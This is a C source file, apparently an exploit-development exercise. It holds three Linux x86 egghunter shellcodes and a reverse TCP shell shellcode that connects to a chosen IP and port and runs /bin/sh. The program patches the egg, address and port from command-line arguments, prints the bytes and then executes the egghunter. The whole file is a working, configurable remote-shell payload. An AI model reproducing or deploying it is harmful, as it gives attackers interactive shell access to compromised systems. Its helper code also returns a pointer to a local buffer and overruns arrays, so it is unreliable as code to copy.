#include <stdio.h>
#include <string.h>
#include <netdb.h>

void PrintShellcode(unsigned char* s);
void change_shellcode_bytes(unsigned char shellcode[], int offset, int n, unsigned char new[]);
unsigned char* ConvertStrToHex(unsigned char* s);

unsigned char egghunter[][200] = {
    "\xBB\x90\x50\x90\x50\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x60\x8D\x5A\x04\xB0\x21\xCD\x80\x3C\xF2\x61\x74\xED\x39\x1A\x75\xEE\x39\x5A\x04\x75\xE9\xFF\xE2",
    "\x31\xC9\x31\xD2\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x90\x50\x90\x50\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7",
    "\x31\xC9\x66\x81\xC9\xFF\x0F\x41\x6A\x43\x58\xCD\x80\x3C\xF2\x74\xF1\xB8\x90\x50\x90\x50\x89\xCF\xAF\x75\xEC\xAF\x75\xE9\xFF\xE7"
};

unsigned char shellcode[] =
    "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

int eggsize = 4;

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <egghunter> [egg] [IP] [Port]\n", argv[0]);
        printf("Example: %s 0 0x9050 127.1.1.1 4444\n", argv[0]);
        return 0;
    }

    int eh = atoi((char *)argv[1]);
    if (eh < 0 || eh > 2) {
        printf("Invalid Egghunter: %d!\n", eh);
        return 0;
    }

    if (argc > 2) {
        if (argv[2][0] == '0' && argv[2][1] == 'x') argv[2] += 2;

        if (strlen(argv[2]) != 4 && strlen(argv[2]) != 8) {
            printf("Egg has to be at least 4 or exactly 8 bytes!\n");
            return 0;
        }

        int i;
        for (i = 0; i < strlen(argv[2]); i += 2)
            if (argv[2][i] == '0' && argv[2][i + 1] == '0') {
                printf("No null bytes!\n");
                return 0;
            }
    }

    int eh_offset = 1;
    if (eh == 1) eh_offset = 23;
    else if (eh == 2) eh_offset = 18;

    if (argc > 2) {
        unsigned char *new_egg = argv[2], *s, *tmp;
        printf("Changing egg to %s...\n", new_egg);

        s = ConvertStrToHex(argv[2]);
        tmp = s;

        strcat(tmp, s);
        if (strlen(argv[2]) == 4)
            strcat(tmp, tmp);

        change_shellcode_bytes(egghunter[eh], eh_offset, eh_offset + 3, s);
        change_shellcode_bytes(shellcode, 0, 7, tmp);
    }

    printf("Egghunter %d, size %d\n", eh, strlen(egghunter[eh]));
    printf("Egghunter shellcode:\n");
    PrintShellcode(egghunter[eh]);

    printf("\nReverse TCP Shellcode (%d bytes):\n", strlen(shellcode));

    unsigned char *s2 = shellcode;
    if (argc > 3) {
        struct sockaddr_in ipaddr;
        inet_aton(argv[3], &ipaddr.sin_addr.s_addr);

        int i = eggsize * 2 + 26, a;
        int e = i + 3;

        for (i, a = 0; i <= e; i++, a += 8) {
            s2[i] = (ipaddr.sin_addr.s_addr >> a) & 0xff;
        }
    }

    int port = 4444;
    if (argc > 4) {
        port = atoi(argv[4]);
        unsigned int p1 = (port >> 8) & 0xff;
        unsigned int p2 = port & 0xff;
        s2[eggsize * 2 + 32] = (unsigned char) {p1};
        s2[eggsize * 2 + 33] = (unsigned char) {p2};
    }

    printf("Port %d\n", port);
    PrintShellcode(s2);

    printf("\n");
    int (*ret)() = (int(*)()) egghunter[eh];
    ret();

    return 0;
}

void change_shellcode_bytes(unsigned char *shellcode_n, int offset, int n, unsigned char *new) {
    int i, a;
    for (i = offset, a = 0; i <= n; i++, a++)
        shellcode_n[i] = (unsigned char) {new[a]};
}

void PrintShellcode(unsigned char *s) {
    printf("\"");
    while (*s)
        printf("\\x%.02x", (unsigned int) *s++);

    printf("\"\n");
}

unsigned char *ConvertStrToHex(unsigned char *s) {
    if (s[0] == '0' && s[1] == 'x') s += 2;
    unsigned char buf[strlen(s) / 2];
    buf[strlen(s) / 2] = '\0';

    int len = sizeof(buf);
    size_t count;

    for (count = 0; count < len; count++) {
        sscanf(s, "%2hhx", &buf[count]);
        s += 2;
    }

    return buf;
}
